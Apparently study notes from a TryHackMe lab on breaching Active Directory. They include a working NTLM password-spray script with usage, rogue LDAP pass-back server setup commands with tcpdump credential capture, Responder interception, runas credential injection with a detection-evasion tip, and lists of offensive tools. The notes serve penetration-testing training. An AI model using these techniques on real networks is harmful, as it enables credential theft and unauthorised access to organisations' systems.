# Breaching Active Directory

Techniques for acquiring Active Directory credentials and enumerating Active Directory

## Techniques

* Techniques for breaching AD
  * NTLM Authenticated Services
  * LDAP Bind Credentials
  * Authentication Relays
  * Microsoft Deployment Toolkit
  * Configuration Files
  * Phishing
* OSINT services for finding AD credentials
  * <https://stackoverflow.com/>
  * <https://github.com/>
  * Past breach credentials:
    * <https://haveibeenpwned.com/>
    * <https://www.dehashed.com/>

### NTLM and NetNTLM

New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD

* HetHTLM services exposed to internet:
  * On-premises Exchange/Outlook OWA
  * RDP
  * AD integrated VPN endpoints
  * Internet facing web apps

### NTLM Brute Forcing

* Password spray script example:

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

* ntlm_passwordspray.py Usage: `python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>`
  * `<userfile>` - Textfile containing our usernames - "usernames.txt"
  * `<fqdn>` - Fully qualified domain name associated with the organisation that we are attacking - "targetme.com"
  * `<password>` - The password we want to use for our spraying attack - "Changeme123"
  * `<attackurl>` - The URL of the application that supports Windows Authentication - "http://ntlmauth.targetme.com"

### LDAP

Lightweight Directory Access Protocol (LDAP) authentication is similar to NTLM authentication, but directly verifies credentials via a pair of AD credentials

* Attempt to recover the AD credentials used by the service to gain authenticated access to AD
* Common LDAP services:
  * Gitlab
  * Jenkins
  * Custom-developed web applications
  * Printers
  * VPNs

### LDAP Pass-back Attacks

* Redirecting the LDAP server request in order to intercept the LDAP credentials
* Use netcat listener while sending LDAP request: `nc -lvp 389`
* Hosting a Rogue LDAP Server
  * Install OpenLDAP: `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
  * Configure server: `sudo dpkg-reconfigure -p low slapd`
  * Create olcSaslSecProps.ldif file with:

```bash
    #olcSaslSecProps.ldif
    dn: cn=config
    replace: olcSaslSecProps
    olcSaslSecProps: noanonymous,minssf=0,passcred
```

* Patch LDAP server: `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
* Test if configuration has been applied: `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`
* Run tcpdump to grab credentials: `sudo tcpdump -SX -i breachad tcp port 389`
* Run the test LDAP credentials in the GUI

### NetNTLM authentication used by SMB

The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Older versions of SMB have vulnerabilities.

Exploits for NetNTLM authentication with SMB:

* Intercept NTLM challenges and crack offline, though this is much slower than cracking NTLM hashes directly
* Man in the middle attack to intercept and relay the aythentication to gain an authenticated session and access to target

* Responder to attempt to intercept the NetNTLM
* LLMNR, NBT-NS, and WPAD
* Resonder listens to these requests and starts host servers like SMB, HTTP, SQL to capture and force authentication

To start responder: `sudo responder -I tun0`

systemd-resolve --interface breachad --set-dns 10.200.20.101 --set-domain za.tryhackme.com

### Microsoft Deployment Toolkit

MDT and SCCM

Usually, MDT is integrated with Microsoft's System Center Configuration Manager (SCCM), which manages all updates for all Microsoft applications, services, and operating systems

Large organisations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images.

<https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/>

### Configuration Files

Web application config files
Service configuration files
Registry keys
Centrally deployed applications




There are several open source resources available for learning how to breach Active Directory. Some of the most popular resources include:

ADLab: ADLab is an open source Active Directory testing lab that provides a safe and isolated environment for testing and learning about Active Directory security.

Active Directory Attack Toolkit (ADAT): ADAT is an open source toolkit for penetration testing Active Directory environments.

BloodHound: BloodHound is an open source tool for visualizing the relationships and permissions within an Active Directory environment.

Mimikatz: Mimikatz is an open source tool for dumping and analyzing Windows credentials, including those stored in Active Directory.

Rubeus: Rubeus is an open source tool for performing various Active Directory-related attacks, including Kerberos abuse.

## Resources

* [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
* [Windows & Active Directory Exploitation Cheat Sheet and Command Reference :: Cas van Cooten](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
)
* 

https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff




https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology

https://cheatsheet.haax.fr/open-source-intelligence-osint/tools-and-methodology/methodology/

https://wadcoms.github.io/

## Credential Injection

* Credential Injection Using runas.exe:

```cmd
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

* runas.exe usage:
  * `/netonly` = do not authenticate against domain controller
  * `/usaer` = domain credentials using FQDN
  * `cmd.exe` = program to execute once credentials are injected


* `dir \\za.tryhackme.com\SYSVOL` v `dir \\<DC IP>\SYSVOL`
  * `dir \\za.tryhackme.com\SYSVOL` attempts Kerberos authentication
  * `dir \\<DC IP>\SYSVOL` attempts NTLM authentication
    * Forcing NTLM helps avoid detection



* Resources: using NTLM authentication to authenticate to web applications: https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/

https://www.hackingarticles.in/impacket-guide-smb-msrpc/
https://github.com/fortra/impacket 
